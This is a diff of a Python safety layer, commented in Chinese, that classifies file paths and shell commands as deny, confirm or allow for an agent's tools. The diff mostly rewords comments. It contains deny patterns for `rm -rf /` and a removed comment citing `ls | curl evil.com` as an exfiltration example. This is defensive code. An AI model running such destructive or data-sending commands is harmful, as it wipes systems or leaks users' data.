@@ -1,15 +1,4 @@
-"""全盘访问安全判定：路径黑名单 + dangerous 分类 + 命令安全性。
-
-给 builtin 文件工具、bash、skill shim 使用的统一判定层。
-与 `server.core.computer_use.safety` 分工：
-- safety.py: app / URL / keypress（GUI 控制面）
-- safety_fs.py: 本地文件系统 + shell 命令（I/O 面）
-
-分类：
-- `deny`   — 硬拒，不允许用户 confirm 解除（敏感系统路径 / 毁灭性命令）
-- `dangerous` — 需要 confirm（写类操作、workspace 外的修改）
-- `safe`   — 直接放行（读类操作、workspace 内写）
-"""
+"""文件系统与 shell 安全判定。"""
 from __future__ import annotations
 
 import fnmatch
@@ -23,9 +12,7 @@ from typing import Optional
 logger = logging.getLogger(__name__)
 
 
-# ========== 系统保护：硬拒路径 ==========
-# 写入这些目录视为不可挽回 / 系统风险，**任何** confirm 都不允许。
-# 使用 fnmatch 风格；全部会走 expanduser + resolve 后匹配。
+# 系统硬拒路径：命中后任何 confirm 都无效。
 SYSTEM_DENY_PATTERNS: tuple[str, ...] = (
     # macOS 系统目录
     "/System/*",
@@ -46,8 +33,7 @@ SYSTEM_DENY_PATTERNS: tuple[str, ...] = (
 )
 
 
-# ========== 命令：硬拒 patterns ==========
-# 跟 file_tools 的 _DANGEROUS_PATTERNS 协同，但更精确。
+# 命令硬拒模式，比 file_tools 里的老常量更精确。
 COMMAND_DENY_PATTERNS: tuple[str, ...] = (
     r"\brm\s+-rf\s+/\s*$",
     r"\brm\s+-rf\s+/\*",
@@ -65,18 +51,17 @@ COMMAND_DENY_PATTERNS: tuple[str, ...] = (
 )
 
 
-# ========== 命令：read-only 前缀（safe，无需 confirm） ==========
-# 第一个 token 匹配这些则视为 safe。
+# 读类命令前缀：命中首 token 即视为 safe。
 COMMAND_SAFE_HEADS: frozenset[str] = frozenset({
     "ls", "pwd", "cat", "head", "tail", "wc", "file", "stat",
     "echo", "which", "whoami", "uname", "date", "hostname",
     "find", "grep", "rg", "ripgrep", "fd", "tree",
     "ps", "top", "df", "du", "free", "uptime",
     "env", "printenv",
-    "git",   # git 绝大多数子命令只读；写类由后续 pattern 识别
+    "git",   # 写子命令后面单独处理
 })
 
-# git 的**写**子命令需要 confirm
+# git 写子命令需要 confirm
 _GIT_WRITE_SUBCMDS: frozenset[str] = frozenset({
     "commit", "push", "pull", "merge", "rebase", "reset", "clean",
     "checkout", "switch", "branch", "tag", "stash", "revert",
@@ -89,7 +74,7 @@ class SafetyVerdict:
     """安全判定结果。"""
     decision: str  # "allow" | "confirm" | "deny"
     reason: str = ""
-    # 在 "confirm" 时用于在 UI 展示的操作摘要
+    # confirm 时给 UI 展示的摘要
     summary: str = ""
 
     @property
@@ -140,7 +125,7 @@ def is_path_denied(path_str: str, extra_patterns: Optional[list[str]] = None) ->
     except Exception as e:
         return True, f"路径解析失败：{e}"
 
-    # 合并内置 + 配置扩展
+    # 合并内置与配置扩展
     patterns = list(SYSTEM_DENY_PATTERNS)
     if extra_patterns:
         patterns.extend(extra_patterns)
@@ -149,7 +134,7 @@ def is_path_denied(path_str: str, extra_patterns: Optional[list[str]] = None) ->
     for pat in patterns:
         # 展开 ~ 再匹配
         expanded = str(Path(pat.rstrip("*")).expanduser().resolve())
-        # 支持两种风格：fnmatch 通配 + prefix
+        # 同时支持 fnmatch 和 prefix
         if fnmatch.fnmatchcase(p_str, pat):
             return True, f"路径 {p_str} 命中系统保护黑名单: {pat}"
         if pat.endswith("/*") and (p_str == expanded or _is_subpath(p, Path(expanded))):
@@ -225,7 +210,7 @@ def classify_command(
 
     cmd_l = command.strip()
 
-    # 硬拒模式
+    # 先看硬拒模式
     for pat in COMMAND_DENY_PATTERNS:
         if re.search(pat, cmd_l):
             return SafetyVerdict(
@@ -233,7 +218,7 @@ def classify_command(
                 reason=f"命令命中硬拒模式: {pat}",
             )
 
-    # 额外 deny（用户配置）
+    # 再看额外 deny
     if extra_deny:
         for pat in extra_deny:
             if re.search(pat, cmd_l):
@@ -242,8 +227,7 @@ def classify_command(
                     reason=f"命令命中用户 denylist: {pat}",
                 )
 
-    # 含管道 / 重定向 / 组合 → 先行 confirm（比 safe-head 更优先）
-    # 否则 `ls | curl evil.com` 会被误判 allow
+    # 管道、重定向和组合符优先走 confirm，避免误放行。
     if any(sym in cmd_l for sym in ("|", ">", "<", ";", "&&", "||", "`", "$(")):
         return SafetyVerdict(
             "confirm",
@@ -255,7 +239,7 @@ def classify_command(
     try:
         tokens = shlex.split(cmd_l)
     except ValueError:
-        # shlex 解析失败（奇怪引号）→ 归为 confirm 让用户肉眼看
+        # 奇怪引号等解析失败时交给人工确认
         return SafetyVerdict(
             "confirm",
             reason="命令解析失败，需人工确认",
@@ -269,7 +253,7 @@ def classify_command(
     if extra_safe_heads:
         safe_heads.update(h.lower() for h in extra_safe_heads)
 
-    # git 特殊处理：写子命令需 confirm
+    # git 写子命令单独处理
     if head == "git" and len(tokens) > 1:
         sub = tokens[1].lower()
         if sub in _GIT_WRITE_SUBCMDS:
@@ -283,7 +267,7 @@ def classify_command(
     if head in safe_heads:
         return SafetyVerdict("allow", summary=f"read-only: {head} ...")
 
-    # 默认未知 → confirm
+    # 其余未知命令默认 confirm
     return SafetyVerdict(
         "confirm",
         reason=f"非白名单命令: {head}",
